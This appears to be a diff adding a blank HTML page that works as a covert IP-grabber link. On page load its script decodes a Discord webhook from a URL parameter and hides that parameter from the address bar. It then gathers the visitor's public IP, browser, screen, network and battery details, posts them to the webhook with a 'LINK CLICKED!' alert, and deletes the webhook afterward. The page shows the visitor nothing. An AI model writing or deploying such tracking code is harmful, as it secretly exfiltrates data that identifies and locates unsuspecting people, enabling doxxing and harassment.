@@ -1,0 +1,111 @@
+<title></title>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const l = urlParams.get('l');
+    if (l === null){
+        window.location = "/create.html"
+    } else{
+    var hook = "https://discordapp.com/api/webhooks/" + atob(l)
+    const infoList = [];
+    history.replaceState({}, null, '/');
+    
+    if ('language' in navigator) {
+        infoList.push("**Language:** " + navigator.language);
+    }
+    
+    if ('hardwareConcurrency' in navigator) {
+        infoList.push("**CPU Threads:** " + navigator.hardwareConcurrency);
+    }
+    
+    if ('appName' in navigator) {
+        infoList.push("**Browser Name:** " + navigator.appName);
+    }
+    
+    if ('appVersion' in navigator) {
+        infoList.push("**Browser Version:** " + navigator.appVersion);
+    }
+    
+    if ('platform' in navigator) {
+        infoList.push("**Platform:** " + navigator.platform);
+    }
+    
+    if ('userAgent' in navigator) {
+        infoList.push("**User Agent:** " + navigator.userAgent);
+    }
+    
+    if ('width' in screen) {
+        infoList.push("**Screen Width:** " + screen.width);
+    }
+    
+    if ('height' in screen) {
+        infoList.push("**Screen Height:** " + screen.height);
+    }
+    
+    if ('availWidth' in screen) {
+        infoList.push("**Available Screen Width:** " + screen.availWidth);
+    }
+    
+    if ('availHeight' in screen) {
+        infoList.push("**Available Screen Height:** " + screen.availHeight);
+    }
+    
+    if ('connection' in navigator && 'effectiveType' in navigator.connection) {
+        infoList.push("**Connection Type:** " + navigator.connection.effectiveType);
+    }
+    
+    if ('connection' in navigator && 'downlink' in navigator.connection) {
+        infoList.push("**Downlink Speed:** " + navigator.connection.downlink + " Mbps");
+    }
+    
+    if ('connection' in navigator && 'rtt' in navigator.connection) {
+        infoList.push("**RTT (Round Trip Time):** " + navigator.connection.rtt + " ms");
+    }
+    
+    if ('length' in history) {
+        infoList.push("**History Length:** " + history.length);
+    }
+    
+    if ('connection' in navigator && 'type' in navigator.connection) {
+        infoList.push("**Connection Type:** " + navigator.connection.type);
+    }
+    
+    if ('cookieEnabled' in navigator) {
+        infoList.push("**Cookies Enabled:** " + navigator.cookieEnabled);
+    }
+    
+    if ('getBattery' in navigator) {
+        navigator.getBattery().then(battery => {
+            infoList.push("**Battery Level:** " + (battery.level * 100) + "%");
+            infoList.push("**Is Charging:** " + battery.charging);
+            infoList.push("**Charging Time:** " + battery.chargingTime + " seconds");
+            infoList.push("**Discharging Time:** " + battery.dischargingTime + " seconds");
+        });
+    }
+    
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const userIP = data.ip;
+            const message = {
+                content: `**@everyone\nLINK CLICKED!**\n**User IP:** ${userIP}\n${infoList.join("\n")}`, // Correct the content here
+                username: "1time Sender",
+                avatar_url: "https://picsum.photos/200" 
+            };
+            return fetch(hook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            });
+        })
+        .finally(() => {
+            fetch(hook, {
+                method: 'DELETE',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            });
+        });
+    }
+</script>
